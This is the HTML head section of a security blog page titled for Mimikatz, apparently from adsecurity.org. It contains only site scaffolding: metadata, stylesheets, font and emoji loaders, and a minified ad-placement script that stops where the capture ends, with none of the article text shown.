<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head profile="http://gmpg.org/xfn/11">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <title>Mimikatz &#187; Active Directory Security</title>
    <link rel="pingback" href="https://adsecurity.org/xmlrpc.php" /> 
    <link rel="alternate" type="application/rss+xml" title="Active Directory Security &raquo; Feed" href="https://adsecurity.org/?feed=rss2" />
<link rel="alternate" type="application/rss+xml" title="Active Directory Security &raquo; Comments Feed" href="https://adsecurity.org/?feed=comments-rss2" />
	<script type="text/javascript">
	WebFontConfig = {
		google: { families: ['Pontano+Sans::latin'] }
	};
	(function() {
		var wf = document.createElement('script');
		wf.src = ('https:' == document.location.protocol ? 'https' : 'http') + '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
		wf.type = 'text/javascript';
		wf.async = 'true';
		var s = document.getElementsByTagName('script')[0];
		s.parentNode.insertBefore(wf, s);
	})(); 
    </script>
    		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"https:\/\/adsecurity.org\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4.1"}};
			!function(a,b,c){function d(a){var c,d=b.createElement("canvas"),e=d.getContext&&d.getContext("2d");return e&&e.fillText?(e.textBaseline="top",e.font="600 32px Arial","flag"===a?(e.fillText(String.fromCharCode(55356,56806,55356,56826),0,0),d.toDataURL().length>3e3):"diversity"===a?(e.fillText(String.fromCharCode(55356,57221),0,0),c=e.getImageData(16,16,1,1).data.toString(),e.fillText(String.fromCharCode(55356,57221,55356,57343),0,0),c!==e.getImageData(16,16,1,1).data.toString()):("simple"===a?e.fillText(String.fromCharCode(55357,56835),0,0):e.fillText(String.fromCharCode(55356,57135),0,0),0!==e.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='graphene-stylesheet-css'  href='https://adsecurity.org/wp-content/themes/graphene/style.css?ver=4.4.1' type='text/css' media='screen' />
<script type='text/javascript' src='https://adsecurity.org/wp-includes/js/jquery/jquery.js?ver=1.11.3'></script>
<script type='text/javascript' src='https://adsecurity.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript' src='https://adsecurity.org/wp-content/themes/graphene/js/jquery.tools.min.js?ver=4.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var grapheneJS = {"templateUrl":"https:\/\/adsecurity.org\/wp-content\/themes\/graphene","isSingular":"1","shouldShowComments":"1","commentsOrder":"newest","sliderDisable":"","sliderAnimation":"horizontal-slide","sliderTransSpeed":"400","sliderInterval":"7000","sliderDisplay":"thumbnail-excerpt","infScroll":"","infScrollClick":"","infScrollComments":"","totalPosts":"1","postsPerPage":"10","isPageNavi":"","infScrollMsgText":"Fetching window.grapheneInfScrollItemsPerPage more item from window.grapheneInfScrollItemsLeft left ...","infScrollMsgTextPlural":"Fetching window.grapheneInfScrollItemsPerPage more items from window.grapheneInfScrollItemsLeft left ...","infScrollFinishedText":"No more items to fetch","commentsPerPage":"50","totalComments":"0","infScrollCommentsMsg":"Fetching window.grapheneInfScrollCommentsPerPage more top level comment from window.grapheneInfScrollCommentsLeft left ...","infScrollCommentsMsgPlural":"Fetching window.grapheneInfScrollCommentsPerPage more top level comments from window.grapheneInfScrollCommentsLeft left ...","infScrollCommentsFinishedMsg":"No more comments to fetch"};
/* ]]> */
</script>
<script type='text/javascript' src='https://adsecurity.org/wp-content/themes/graphene/js/graphene.js?ver=4.4.1'></script>
<link rel='https://api.w.org/' href='https://adsecurity.org/?rest_route=/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://adsecurity.org/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://adsecurity.org/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.4.1" />
<link rel="canonical" href="https://adsecurity.org/?page_id=1821" />
<link rel='shortlink' href='https://adsecurity.org/?p=1821' />
<link rel="alternate" type="application/json+oembed" href="https://adsecurity.org/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2Fadsecurity.org%2F%3Fpage_id%3D1821" />
<link rel="alternate" type="text/xml+oembed" href="https://adsecurity.org/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2Fadsecurity.org%2F%3Fpage_id%3D1821&#038;format=xml" />
<meta name="google-site-verification" content="ZeBTmVybgh1yRwoebNFbBr2qY6-50BFxia9UsVDm1rQ" /><style type="text/css">
#sidebar_bottom .sidebar-wrap{width:426px}#nav li ul{width:200px} #nav li ul ul{margin-left:200px}#header-menu ul li a, #secondary-menu ul li a{width:180px}.container_16 {width:1400px}.container_16 .grid_1{width:67.5px}.container_16 .prefix_1{padding-left:87.5px}.container_16 .suffix_1{padding-right:87.5px}.container_16 .push_1{left:87.5px}.container_16 .pull_1{left:-87.5px}.container_16 .grid_2{width:155px}.container_16 .prefix_2{padding-left:175px}.container_16 .suffix_2{padding-right:175px}.container_16 .push_2{left:175px}.container_16 .pull_2{left:-175px}.container_16 .grid_3{width:242.5px}.container_16 .prefix_3{padding-left:262.5px}.container_16 .suffix_3{padding-right:262.5px}.container_16 .push_3{left:262.5px}.container_16 .pull_3{left:-262.5px}.container_16 .grid_4{width:330px}.container_16 .prefix_4{padding-left:350px}.container_16 .suffix_4{padding-right:350px}.container_16 .push_4{left:350px}.container_16 .pull_4{left:-350px}.container_16 .grid_5{width:417.5px}.container_16 .prefix_5{padding-left:437.5px}.container_16 .suffix_5{padding-right:437.5px}.container_16 .push_5{left:437.5px}.container_16 .pull_5{left:-437.5px}.container_16 .grid_6{width:505px}.container_16 .prefix_6{padding-left:525px}.container_16 .suffix_6{padding-right:525px}.container_16 .push_6{left:525px}.container_16 .pull_6{left:-525px}.container_16 .grid_7{width:592.5px}.container_16 .prefix_7{padding-left:612.5px}.container_16 .suffix_7{padding-right:612.5px}.container_16 .push_7{left:612.5px}.container_16 .pull_7{left:-612.5px}.container_16 .grid_8{width:680px}.container_16 .prefix_8{padding-left:700px}.container_16 .suffix_8{padding-right:700px}.container_16 .push_8{left:700px}.container_16 .pull_8{left:-700px}.container_16 .grid_9{width:767.5px}.container_16 .prefix_9{padding-left:787.5px}.container_16 .suffix_9{padding-right:787.5px}.container_16 .push_9{left:787.5px}.container_16 .pull_9{left:-787.5px}.container_16 .grid_10{width:855px}.container_16 .prefix_10{padding-left:875px}.container_16 .suffix_10{padding-right:875px}.container_16 .push_10{left:875px}.container_16 .pull_10{left:-875px}.container_16 .grid_11{width:942.5px}.container_16 .prefix_11{padding-left:962.5px}.container_16 .suffix_11{padding-right:962.5px}.container_16 .push_11{left:962.5px}.container_16 .pull_11{left:-962.5px}.container_16 .grid_12{width:1030px}.container_16 .prefix_12{padding-left:1050px}.container_16 .suffix_12{padding-right:1050px}.container_16 .push_12{left:1050px}.container_16 .pull_12{left:-1050px}.container_16 .grid_13{width:1117.5px}.container_16 .prefix_13{padding-left:1137.5px}.container_16 .suffix_13{padding-right:1137.5px}.container_16 .push_13{left:1137.5px}.container_16 .pull_13{left:-1137.5px}.container_16 .grid_14{width:1205px}.container_16 .prefix_14{padding-left:1225px}.container_16 .suffix_14{padding-right:1225px}.container_16 .push_14{left:1225px}.container_16 .pull_14{left:-1225px}.container_16 .grid_15{width:1292.5px}.container_16 .prefix_15{padding-left:1312.5px}.container_16 .suffix_15{padding-right:1312.5px}.container_16 .push_15{left:1312.5px}.container_16 .pull_15{left:-1312.5px}.container_16 .grid_16{width:1380px}.container_16 .prefix_16{padding-left:1400px}.container_16 .suffix_16{padding-right:1400px}.container_16 .push_16{left:1400px}.container_16 .pull_16{left:-1400px}.header-img {margin-left: -700px}#content-main, #content-main .grid_11, .container_16 .slider_post, #comments #respond {width:950px}#sidebar1, #sidebar2 {width:350px}.comment-form-author, .comment-form-email, .comment-form-url {width:296.66666666667px}.graphene-form-field {width:288.66666666667px}#commentform textarea {width:922px}
</style>
	<!--[if lte IE 7]>
      <style type="text/css" media="screen">
      	#footer, div.sidebar-wrap, .block-button, .featured_slider, #slider_root, #nav li ul, .pie{behavior: url(https://adsecurity.org/wp-content/themes/graphene/js/PIE.php);}
        .featured_slider{margin-top:0 !important;}
        #header-menu-wrap {z-index:5}
      </style>
    <![endif]-->
    		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		<meta data-pso-pv="1.2.1" data-pso-pt="page" data-pso-th="18eb7047696482af8751eacce85ea5d6"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script pagespeed_no_defer="" data-pso-version="20160124_201017">window.dynamicgoogletags={config:[]};dynamicgoogletags.config=["ca-pub-4309671102619742",[[[["DIV",,"header-menu-wrap",[]],["10px","10px",1],2,[1],"9855435313",0],[["DIV",,"content",[]],["10px","10px",1],2,[3],"2332168511",0],[["DIV",,,["menu-links-container"]],["10px","10px",0],3,[0],"3808901719",0]]],[[[],[[["BODY",0,,[]],["10px","10px",1],1,[4],,0,,,2],[["BODY",0,,[]],["10px","10px",1],2,[5],,0,,,2],[["DIV",,,["entry-content"]],["10px","10px",1],3,[3],,0,,,5],[["DIV",,,["footer-text"]],["10px","10px",1],0,[5],,0,,,3],[["DIV",0,,["status-publish"],0],["19.5px","14.399999618530273px",0],0,[0],,0,,,6],[["DIV",0,,["status-publish"],1],["19.5px","10px",0],0,[0],,0,,,6],[["DIV",0,,["status-publish"],2],["21.599998474121094px","10px",0],0,[0],,0,,,6],[["DIV",0,,["status-publish"],-1],["21.599998474121094px","10px",0],3,[0],,0,,,7]],["2639892919","4116626117","5593359315","2477795710","3954528919"],["DIV",,,["status-publish"]],"20160125_041203"]],"WordPressPage","2750970915",,0.01,,[,1454954578434],0.01,0,,,"http://adsecurity.org"];(function(){var h=this,aa=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";
else if("function"==b&&"undefined"==typeof a.call)return"object";return b},r=function(a){return"number"==typeof a},t=function(a,b){function c(){}c.prototype=b.prototype;a.wa=b.prototype;a.prototype=new c;a.prototype.constructor=a;a.qa=function(a,c,f){for(var g=Array(arguments.length-2),k=2;k<arguments.length;k++)g[k-2]=arguments[k];return b.prototype[c].apply(a,g)}};var ba=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")},ca=function(a,b){return a<b?-1:a>b?1:0};var u;a:{var da=h.navigator;if(da){var fa=da.userAgent;if(fa){u=fa;break a}}u=""}var v=function(a){return-1!=u.indexOf(a)};var ga=v("Opera")||v("OPR"),w=v("Trident")||v("MSIE"),ha=v("Edge"),ia=v("Gecko")&&!(-1!=u.toLowerCase().indexOf("webkit")&&!v("Edge"))&&!(v("Trident")||v("MSIE"))&&!v("Edge"),ja=-1!=u.toLowerCase().indexOf("webkit")&&!v("Edge"),ka=function(){var a=u;if(ia)return/rv\:([^\);]+)(\)|;)/.exec(a);if(ha)return/Edge\/([\d\.]+)/.exec(a);if(w)return/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);if(ja)return/WebKit\/(\S+)/.exec(a)},la=function(){var a=h.document;return a?a.documentMode:void 0},ma=function(){if(ga&&
h.opera){var a;var b=h.opera.version;try{a=b()}catch(c){a=b}return a}a="";(b=ka())&&(a=b?b[1]:"");return w&&(b=la(),b>parseFloat(a))?String(b):a}(),na={},oa=function(a){if(!na[a]){for(var b=0,c=ba(String(ma)).split("."),d=ba(String(a)).split("."),e=Math.max(c.length,d.length),f=0;0==b&&f<e;f++){var g=c[f]||"",k=d[f]||"",n=RegExp("(\\d*)(\\D*)","g"),l=RegExp("(\\d*)(\\D*)","g");do{var m=n.exec(g)||["","",""],q=l.exec(k)||["","",""];if(0==m[0].length&&0==q[0].length)break;b=ca(0==m[1].length?0:parseInt(m[1],
10),0==q[1].length?0:parseInt(q[1],10))||ca(0==m[2].length,0==q[2].length)||ca(m[2],q[2])}while(0==b)}na[a]=0<=b}},pa=h.document,qa=pa&&w?la()||("CSS1Compat"==pa.compatMode?parseInt(ma,10):5):void 0;var x=function(){},A=function(a,b,c){a.b=null;b||(b=[]);a.va=void 0;a.K=-1;a.g=b;a:{if(a.g.length){b=a.g.length-1;var d=a.g[b];if(d&&"object"==typeof d&&"array"!=aa(d)){a.R=b-a.K;a.H=d;break a}}a.R=Number.MAX_VALUE}if(c)for(b=0;b<c.length;b++)d=c[b],d<a.R?(d+=a.K,a.g[d]=a.g[d]||y):a.H[d]=a.H[d]||y},y=[],B=function(a,b){if(b<a.R){var c=b+a.K,d=a.g[c];return d===y?a.g[c]=[]:d}d=a.H[b];return d===y?a.H[b]=[]:d},C=function(a,b,c){b<a.R?a.g[b+a.K]=c:a.H[b]=c},D=function(a,b,c){a.b||(a.b={});if(!a.b[c]){var d=
B(a,c);d&&(a.b[c]=new b(d))}return a.b[c]},E=function(a,b,c){a.b||(a.b={});if(!a.b[c]){for(var d=B(a,c),e=[],f=0;f<d.length;f++)e[f]=new b(d[f]);a.b[c]=e}b=a.b[c];b==y&&(b=a.b[c]=[]);return b},ra=function(a,b,c){a.b||(a.b={});c=c||[];for(var d=[],e=0;e<c.length;e++)d[e]=c[e].g;a.b[b]=c;C(a,b,d)};x.prototype.toString=function(){return this.g.toString()};
var F=function(a){return new a.constructor(sa(a.g))},sa=function(a){var b;if("array"==aa(a)){for(var c=Array(a.length),d=0;d<a.length;d++)null!=(b=a[d])&&(c[d]="object"==typeof b?sa(b):b);return c}c={};for(d in a)null!=(b=a[d])&&(c[d]="object"==typeof b?sa(b):b);return c};var G=function(a){A(this,a,ta)};t(G,x);var ta=[4];G.prototype.o=function(){return F(this)};var H=function(a){return B(a,5)},I=function(a){A(this,a,null)};t(I,x);I.prototype.o=function(){return F(this)};var ua=function(a){A(this,a,null)};t(ua,x);ua.prototype.o=function(){return F(this)};var J=function(a){return D(a,G,1)},K=function(a){A(this,a,va)};t(K,x);var va=[1];K.prototype.o=function(){return F(this)};K.prototype.i=function(){return E(this,ua,1)};K.prototype.ea=function(a){ra(this,1,a)};var L=function(a){A(this,a,wa)};t(L,x);var wa=[2];L.prototype.o=function(){return F(this)};L.prototype.ca=function(){return B(this,3)};var xa=function(a){A(this,a,null)};t(xa,x);xa.prototype.o=function(){return F(this)};
var M=function(a){A(this,a,ya)};t(M,x);var ya=[1,2,3];M.prototype.o=function(){return F(this)};M.prototype.i=function(){return E(this,ua,2)};M.prototype.ea=function(a){ra(this,2,a)};var N=function(a){A(this,a,za)};t(N,x);var za=[3];N.prototype.o=function(){return F(this)};N.prototype.v=function(){return B(this,1)};N.prototype.C=function(){return D(this,K,2)};N.prototype.P=function(){return B(this,4)};N.prototype.ca=function(){return B(this,5)};N.prototype.O=function(){return D(this,Aa,9)};
var Aa=function(a){A(this,a,null)};t(Aa,x);Aa.prototype.o=function(){return F(this)};var Ea=function(a,b){var c=b||document,d=null,e=B(a,3);if(e)if(d=c.getElementById(e))d=[d];else return[];if(e=B(a,1))if(d){for(var f=[],g=0;g<d.length;++g)d[g].tagName&&d[g].tagName.toUpperCase()==e.toUpperCase()&&f.push(d[g]);d=f}else{d=c.getElementsByTagName(e);e=[];for(f=0;f<d.length;++f)e.push(d[f]);d=e}if((e=B(a,4))&&0<e.length)if(d)for(c=d,d=[],f=0;f<c.length;++f)Ba(c[f],e)&&d.push(c[f]);else{if(!c.body)return[];d=Ca(e,c.body)}c=B(a,2);if(r(c)&&d)if(0>c&&(c+=d.length),d.length>c)d=[d[c]];else return[];
c=H(a);if(r(c)&&d){e=[];for(f=0;f<d.length;f++)g=Da(d[f]),0>c&&(c+=g.length),0<=c&&c<g.length&&e.push(g[c]);d=e}c=B(a,6);if(void 0!==c&&d)switch(c){case 0:return d.slice(1);case 1:return d.slice(0,d.length-1);case 2:return d.slice(1,d.length-1)}return d?d:[]},Fa=function(a){return"INS"==a.tagName&&Ba(a,["adsbygoogle-placeholder"])},Da=function(a){var b=[];a=a.getElementsByTagName("p");for(var c=0;c<a.length;++c)100<=Ga(a[c])&&b.push(a[c]);return b},Ha=function(a,b){if(a==b)return!0;if(!a||!b||B(a,
1)!=B(b,1)||B(a,2)!=B(b,2)||B(a,3)!=B(b,3)||H(a)!=H(b)||B(a,6)!=B(b,6))return!1;var c=B(a,4),d=B(b,4);if(c||d)if(c&&d&&c.length==d.length)for(var e=0;e<c.length;e++){if(c[e]!=d[e])return!1}else return!1;return!0},Ga=function(a){if(3==a.nodeType)return a.length;if(1!=a.nodeType||"SCRIPT"==a.tagName)return 0;for(var b=0,c=0;c<a.childNodes.length;++c)b+=Ga(a.childNodes[c]);return b},Ca=function(a,b){if(b.getElementsByClassName){for(var c=b.getElementsByClassName(a.join(" ")),d=[],e=0;e<c.length;++e)d.push(c[e]);
return d}c=[];Ba(b,a)&&c.push(b);for(e=0;e<b.childNodes.length;++e)1==b.childNodes[e].nodeType&&(c=c.concat(Ca(a,b.childNodes[e])));return c},Ba=function(a,b){for(var c=a.className?a.className.split(/\s+/):[],d={},e=0;e<c.length;++e)d[c[e]]=!0;for(e=0;e<b.length;++e)if(!d[b[e]])return!1;return!0};var Ia;if(!(Ia=!ia&&!w)){var Ja;if(Ja=w)Ja=9<=Number(qa);Ia=Ja}Ia||ia&&oa("1.9.1");w&&oa("9");var O=function(a,b,c,d){this.top=a;this.right=b;this.bottom=c;this.left=d};O.prototype.contains=function(a){return this&&a?a instanceof O?a.left>=this.left&&a.right<=this.right&&a.top>=this.top&&a.bottom<=this.bottom:a.x>=this.left&&a.x<=this.right&&a.y>=this.top&&a.y<=this.bottom:!1};O.prototype.floor=function(){this.top=Math.floor(this.top);this.right=Math.floor(this.right);this.bottom=Math.floor(this.bottom);this.left=Math.floor(this.left);return this};var Ka=function(a,b){for(var c in a)Object.prototype.hasOwnProperty.call(a,c)&&b.call(void 0,a[c],c,a)},La=function(a,b){var c=a.length;if(0==c)return 0;for(var d=b||305419896,e=0;e<c;e++)d^=(d<<5)+(d>>2)+a.charCodeAt(e)&4294967295;return 0<d?d:4294967296+d};var Oa=function(a,b,c,d){var e=Ma;try{if((c?e.pa:Math.random())<(d||e.ja)){var f=e.ia+a+Na(b),f=f.substring(0,2E3);h.google_image_requests||(h.google_image_requests=[]);var g=h.document.createElement("img");g.src=f;h.google_image_requests.push(g)}}catch(k){}},Na=function(a){var b="";Ka(a,function(a,d){if(0===a||a)b+="&"+d+"="+encodeURIComponent(String(a))});return b};var Pa=window;var Qa=/(^| )adsbygoogle($| )/;var Ra=function(a,b){for(var c=a.google_ad_modifications=a.google_ad_modifications||{},c=c.loeids=c.loeids||[],d=0;d<b.length;d++)c.push(b[d])};var Sa=function(a,b,c){this.T=a;this.la=c?c:new Aa};Sa.prototype.O=function(){return this.la||new Aa};var P=function(a){return a.dynamicgoogletags=a.dynamicgoogletags||{}};var Ma;Ma=new function(){this.ia="http"+("http:"===Pa.location.protocol?"":"s")+"://pagead2.googlesyndication.com/pagead/gen_204?id=";this.ja=.01;this.pa=Math.random()};var Ta=function(a){a=a.document;return("CSS1Compat"==a.compatMode?a.documentElement:a.body)||{}},Ua=function(a){return void 0===a.pageYOffset?(a.document.documentElement||a.document.body.parentNode||a.document.body).scrollTop:a.pageYOffset},Va=function(a){return void 0===a.pageXOffset?(a.document.documentElement||a.document.body.parentNode||a.document.body).scrollLeft:a.pageXOffset};var Wa=function(){this.document=document};var Xa=function(a,b,c){switch(a){case 0:b.parentNode&&b.parentNode.insertBefore(c,b);break;case 3:if(a=b.parentNode){var d=b.nextSibling;if(d&&d.parentNode!=a)for(;d&&8==d.nodeType;)d=d.nextSibling;a.insertBefore(c,d)}break;case 1:b.insertBefore(c,b.firstChild);break;case 2:b.appendChild(c)}Fa(b)&&(b.style.display="block")};var Ya=function(a){return!!a.nextSibling||!!a.parentNode&&Ya(a.parentNode)},Za=function(a,b){var c=J(b);if(!c)return null;c=Ea(c,a);return 0<c.length?c[0]:null},ab=function(a,b){var c=$a(a,b,!0);return r(c)&&!(c<=Ta(a).clientHeight)},bb=function(a,b){return a.body?b-a.body.getBoundingClientRect().top:b},$a=function(a,b,c){if(!c||!r(B(b,8))){var d=Za(a.document,b);if(d){var e=D(b,I,2);c=a.document.createElement("div");c.className="googlepublisherpluginad";var f=c.style;f.textAlign="center";f.width=
"100%";f.height="0px";f.clear=e&&B(e,3)?"both":"none";Xa(B(b,3),d,c);d=c.getBoundingClientRect().top+Ua(a);c.parentNode.removeChild(c);C(b,8,d)}}b=B(b,8);return r(b)?b-Ua(a):null},eb=function(a,b,c){switch(b){case 0:return!!cb(a,db(c));case 3:return!!cb(a,c);case 1:return!1;case 2:return b=c.lastChild,!!cb(a,b?1==b.nodeType?b:db(b):null);default:return!1}},cb=function(a,b){if(!b)return!1;var c;c=a.getComputedStyle?a.getComputedStyle(b,null):b.currentStyle;if(!c)return!1;c=c.cssFloat||c.styleFloat;
return"left"==c||"right"==c},fb=function(a){return a.adsbygoogle=a.adsbygoogle||[]},gb=function(a){switch(a){case 0:return"auto";case 1:return"horizontal";case 2:return"vertical";case 3:return"rectangle";default:return"auto"}},db=function(a){for(a=a.previousSibling;a&&1!=a.nodeType;)a=a.previousSibling;return a?a:null},hb=function(a,b){a.sort(function(a,d){var e=$a(b,a,!0),e=r(e)?e:Number.POSITIVE_INFINITY,f=$a(b,d,!0),f=r(f)?f:Number.POSITIVE_INFINITY;return e-f})};var ib=function(a){this.m=a;this.ha=[]};ib.prototype.f=function(){return 0<E(this.m,M,3).length?E(this.m,M,3)[0]:null};var jb=function(a,b){var c=a.google_ad_modifications=a.google_ad_modifications||{};(c.ad_channels=c.ad_channels||[]).push(b)},mb=function(a){a+=kb;var b=La(a);return((b%512*2+1)*lb+La(a,b)%1024)%1024},nb=function(a,b,c){var d=a.length;c-=0;return 0>c||c>=b*d?null:a[c%d]};var ob=function(){this.u=[]};var pb={"120x90":!0,"160x90":!0,"180x90":!0,"200x90":!0,"468x15":!0,"728x15":!0};var qb=function(a,b){var c;c=Ta(a).clientWidth;var d=Ta(a).clientHeight;if(!r(c)||!r(d))throw Error("No VP width and/or height.");var e=Va(a),f=Ua(a);c=new O(f,c+e,d+f,e);return(b.left<c.right&&c.left<b.right&&b.top<c.bottom&&c.top<b.bottom?new O(Math.max(b.top,c.top),Math.min(b.right,c.right),Math.min(b.bottom,c.bottom),Math.max(b.left,c.left)):null)||new O(0,0,0,0)};var rb=function(a){this.j=a;this.X=null;this.B=[];this.L={};this.F=this.S=null},sb=function(a){if(!a.j.ownerDocument)throw Error("Wrapped node should have an owner document.");return a.j.ownerDocument},tb=function(a){a=sb(a);return a.defaultView||a.parentWindow};rb.prototype.getParent=function(){return this.X};rb.prototype.removeChild=function(a){for(var b=0;b<this.B.length;++b)if(this.B[b]==a){this.B[b].X=null;this.B.splice(b,1);break}};
var vb=function(a){if(!a.aa){var b;if(!a.S){b=Va(tb(a));var c=Ua(tb(a));if(a.j.getBoundingClientRect){var d=a.j.getBoundingClientRect();b=new O(d.top+c,d.right+b,d.bottom+c,d.left+b)}else d=sb(a).createRange(),d.selectNodeContents(a.j),d.collapsed?b=new O(0,0,0,0):(d=d.getBoundingClientRect(),b=new O(d.top+c,d.right+b,d.bottom+c,d.left+b));a.S=b}b=a.S;c=Q(a,"position");if("fixed"==c)b=qb(tb(a),b);else if(a.getParent()){if(d=ub(a.getParent(),0,"absolute"==c)){var d=vb(d),e=d.left,d=d.right;b=b.left>=
d||b.right<=e?null:new O(b.top,Math.min(b.right,d),b.bottom,Math.max(b.left,e))}b&&(c=ub(a.getParent(),1,"absolute"==c))&&(d=vb(c),c=d.top,d=d.bottom,b=b.top>=d||b.bottom<=c?null:new O(Math.max(b.top,c),b.right,Math.min(b.bottom,d),b.left));b=b&&wb(a)&&"fixed"==Q(wb(a),"position")?qb(tb(a),b):b||new O(0,0,0,0)}a.aa=b}return a.aa},wb=function(a){if(void 0!==a.V)return a.V;var b;b=Q(a,"position");if("fixed"==b)b=a;else{var c=a.getParent();b=c&&"BODY"!=a.j.tagName?(c=wb(c))||"absolute"!=b&&"relative"!=
b?c:a:null}a.V=b;return a.V},ub=function(a,b,c){if(void 0!==a.L[b])return a.L[b];a.L[b]=xb(a,b,c);return a.L[b]},xb=function(a,b,c){var d=Q(a,"position"),e;a:switch(b){case 0:e="hidden"==Q(a,"overflow")||"scroll"==Q(a,"overflow")||"hidden"==Q(a,"overflow-x")||"scroll"==Q(a,"overflow-x");break a;case 1:e="hidden"==Q(a,"overflow")||"scroll"==Q(a,"overflow")||"hidden"==Q(a,"overflow-y")||"scroll"==Q(a,"overflow-y");break a;default:throw"Unknown pageAxis: "+b;}switch(d){case "fixed":if(e)return a;break;
case "static":case "":if(e&&!c)return a;if(a.getParent())return ub(a.getParent(),b,c);break;case "absolute":case "relative":if(e)return a;if(a.getParent())return ub(a.getParent(),b,"absolute"==d);break;default:window.console.error("Unknown position value.")}return null},Q=function(a,b){if(1!=a.j.nodeType)return null;a.F=a.F||tb(a).getComputedStyle(a.j);return a.F?a.F[b]||a.F.getPropertyValue(b)||"":""},yb=function(a,b){if(b&&3==a.nodeType?!/\S/.test(a.data):1!=a.nodeType&&3!=a.nodeType||a.tagName&&
("SCRIPT"==a.tagName.toUpperCase()||"STYLE"==a.tagName.toUpperCase()))return null;for(var c=new rb(a),d=0;d<a.childNodes.length;++d){var e=yb(a.childNodes[d],b);if(e){var f=c;e.X=f;f.B.push(e)}}return c};var Ab=function(a){this.ga=a;this.M=null;a={};var b=this.ga.ta;try{if(b&&"function"==typeof b.oa)for(var c=b.oa().sa(),b=0;b<c.length;b++){var d=c[b].ra();a[d]=!0}}catch(e){Oa("ladd_evt",{ok:0,err:e.toString()},!0,.1)}this.ma=a;this.N=[];this.ba=[];this.fa=!0;zb(this)},Bb=function(a,b){var c=a.id;return!!c&&!!c.indexOf&&"function"===typeof c.indexOf&&0===c.indexOf(b)},Cb=function(a){zb(a);return 0<a.N.length},zb=function(a){if(a.fa){a.fa=!1;if(!a.M){var b;b=(b=a.ga.document.body)?yb(b):null;a.M=b}a.M&&
Db(a,a.M,a.N,a.ba)}},Db=function(a,b,c,d){var e;if(e=1===b.j.nodeType){e=b.j;var f;(f="INS"==e.tagName&&Qa.test(e.className))||(f=e.id,f=a.ma[f]?!0:"DIV"==e.tagName&&0==f.indexOf("div-gpt-ad"));e=f||Bb(e,"google_ads_frame")||Bb(e,"aswift_")||e.classList.contains("lru_res")}e&&(c.push(b),e=b.j,"IFRAME"!=e.tagName||!Bb(e,"google_ads_frame")&&!Bb(e,"aswift_")?e=!1:(e=vb(b),f=e.bottom-e.top,e=!(pb[e.right-e.left+"x"+f]&&50>f)),e&&d.push(b));b=b.B;for(e=0;e<b.length;e++)Db(a,b[e],c,d)};var R=function(a){this.a=a;this.l=[];this.Z=0;this.G=[];this.u=[];this.$=this.U=null;this.da=!1},Eb=function(a,b){var c;c=a.f();c=D(c,G,4);if(!(c&&b&&B(b,1)==B(c,1)&&B(b,3)==B(c,3)&&r(B(b,2))&&r(H(b))))return!1;c=B(c,4);var d=B(b,4);if(c.length!=d.length)return!1;for(var e=0;e<c.length;++e)if(d[e]!=c[e])return!1;return!0},Fb=function(a){var b=r(void 0)?void 0:20,c=a.f(),d=c.i(),e=D(c,G,4);if(!(a.da||0>=b)&&e&&0!=Ea(e,a.a.document).length){a.da=!0;for(var c=[],f=0;f<d.length;++f){var g=d[f],k=J(g);
